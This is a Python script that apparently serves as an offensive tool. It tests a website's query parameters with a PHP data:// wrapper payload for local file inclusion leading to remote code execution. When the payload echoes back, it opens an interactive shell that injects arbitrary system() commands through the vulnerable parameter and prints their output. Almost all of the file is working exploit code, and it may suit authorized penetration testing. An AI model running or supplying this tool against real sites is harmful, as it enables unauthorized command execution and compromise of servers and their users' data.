import re
import os
import base64
import urllib
import random
import string
import requests

from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory

class DataChecker:
    def __init__(self, url, silent=False):
        self.console = Console()
        self.url = url
        self.silent = silent
        self.random_string = self._generate_random_string()
        self.random_string_base64 = base64.b64encode(self.random_string.encode()).decode()
        self.DATA_PAYLOADS = [
            f'data://text/plain,<?php echo "{self.random_string_base64}"; ?>',
        ]

    def _generate_random_string(self, length=10):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def data_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        payloads = []

        for payload in self.DATA_PAYLOADS:
            payloads.append((payload, re.compile(fr'{self.random_string_base64}')))

        console = Console()
        total_operations = len(params.keys()) * len(payloads)

        if not self.silent:
            return self._scan(params, payloads, parsed_url, console, total_operations)

        return self._scan(params, payloads, parsed_url, console)

    def _scan(self, params, payloads, parsed_url, console, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        for param_name in params.keys():
            for payload, payload_regex in payloads:
                new_params = params.copy()
                new_params[param_name] = payload
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url, verify=False)

                if payload_regex.search(response.text):
                    if not self.silent:
                        console.print(f'\n[bold red]Possible LFI2RCE (data_wrapper: method)[/bold red] (data: method)', style='bold red')
                    return True, param_name

        return False, None
    
    def shell(self, param_name):
        self.silent = True
        if not self.data_check():
            self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
            return

        self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
        
            
        session = PromptSession(history=InMemoryHistory())        
        while True:
            try:
                cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                if "exit" in cmd:
                    raise KeyboardInterrupt
                elif not cmd:
                    continue
                elif "clear" in cmd:
                    if os.name == 'posix':
                        os.system('clear')
                elif os.name == 'nt':
                    os.system('cls')                                                             
                if cmd.lower() in ["exit", "quit"]:
                    break

                shell_code = f"data://text/plain,<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                parsed_url = urllib.parse.urlparse(self.url)
                params = urllib.parse.parse_qs(parsed_url.query)
                new_params = params.copy()
                new_params[param_name] = shell_code
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url)
                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                response_content = pattern.search(response.text)
                if response_content:
                    shell_output = response_content.group(1)
                    self.console.print(f"[bold green]{shell_output}[/bold green]")
                else:
                    self.console.print("[bold red]No shell output.[/bold red]")
                    
            except KeyboardInterrupt:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break        

def main():
    url = input('Enter site URL to test: ')
    checker = DataChecker(url, silent=False)
    result, param_name = checker.data_check()
    print(f"LFI2RCE detected: {result}")
    if result:
        checker.shell(param_name)

if __name__ == '__main__':
    main() 

